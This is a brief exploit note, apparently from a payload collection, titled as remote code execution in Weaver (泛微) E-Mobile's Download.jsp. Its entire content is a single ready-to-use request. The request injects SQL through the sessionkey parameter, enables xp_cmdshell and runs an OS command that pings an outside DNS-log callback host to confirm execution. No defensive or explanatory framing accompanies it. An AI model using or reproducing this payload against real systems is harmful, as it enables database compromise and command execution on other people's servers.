# 泛微 E-Mobile Download.jsp 远程代码执行

    ```
mobile/plugin/Download.jsp?sessionkey=1' EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE exec master..xp_cmdshell 'ping 4a9c47b1.dnslog.click
```
